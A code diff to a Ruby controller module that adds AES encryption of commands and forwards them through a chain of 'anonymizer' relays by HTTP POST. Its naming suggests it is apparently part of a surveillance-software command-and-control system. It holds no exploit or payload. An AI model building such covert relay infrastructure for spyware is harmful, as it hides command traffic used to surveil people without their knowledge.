@@ -1,6 +1,7 @@
 require 'base64'
 
 require 'rcs-common/trace'
+require 'rcs-common/crypt'
 
 module RCS
   module Controller
@@ -10,6 +11,7 @@ module RCS
 
     class ProtocolParser
       include RCS::Tracer
+      include RCS::Crypt
 
       def initialize(method, uri, content, http)
         @http_method = method
@@ -69,15 +71,15 @@ module RCS
         raise "Invalid received cookie" unless @anon
         trace :info, "Anonymizer '#{@anon['name']}' is sending a command..."
 
+        # decrypt the blob
         blob = Base64.decode64(blob)
+        command = aes_decrypt(blob, @anon['key'])
 
-        # TODO: retrieve the encryption keys and decrypt the blob
-
-        blob = JSON.parse(blob)
+        command = JSON.parse(command)
 
         # TODO: anti replay attack
 
-        return blob
+        return command
       end
 
       def protocol_encrypt(cookie, command)
@@ -87,9 +89,9 @@ module RCS
 
         command = command.to_json
 
-        # TODO: encrypt the message
-
-        blob = Base64.encode64(command)
+        # encrypt the message
+        blob = aes_encrypt(command, @anon['key'])
+        blob = Base64.encode64(blob)
 
         return blob
       end
@@ -115,6 +117,7 @@ module RCS
 
         return STATUS_OK, response
       rescue Exception => e
+        puts e.backtrace.join("\n")
         return STATUS_SERVER_ERROR, [{command: 'STATUS', result: {status: 'ERROR', msg: e.message}}]
       end
 
@@ -201,8 +204,8 @@ module RCS
           receiver = chain.pop
 
           # encapsulate for the last anon
-          forward = {command: 'FORWARD', params: {ip: receiver['address'], cookie: receiver['cookie']}, body: msg}
-          msg = protocol_encrypt(receiver['cookie'], msg)
+          forward = {command: 'FORWARD', params: {address: "#{receiver['address']}:#{receiver['port']}", cookie: receiver['cookie']}, body: msg}
+          msg = protocol_encrypt(receiver['cookie'], forward)
 
           trace :debug, "Forwarding through: #{receiver['name']}"
 
@@ -210,9 +213,18 @@ module RCS
 
         trace :info, "Sending complete command to: #{receiver['name']}"
 
-        # TODO: send the command
+        # send the command
+        http = Net::HTTP.new(receiver['address'], receiver['port'])
+        resp = http.send_request('POST', '/', msg, {'Cookie' => receiver['cookie']})
+        # receive, check and decrypt a command
+        reply = protocol_decrypt(resp['cookie'], resp.body)
 
-        return STATUS_OK, 'OK'
+        trace :debug, "Received response: #{reply.inspect}"
+
+        result = reply['result']
+        status = result['status']
+
+        return STATUS_OK, status
       end
 
       def forwarding_chain(anon)
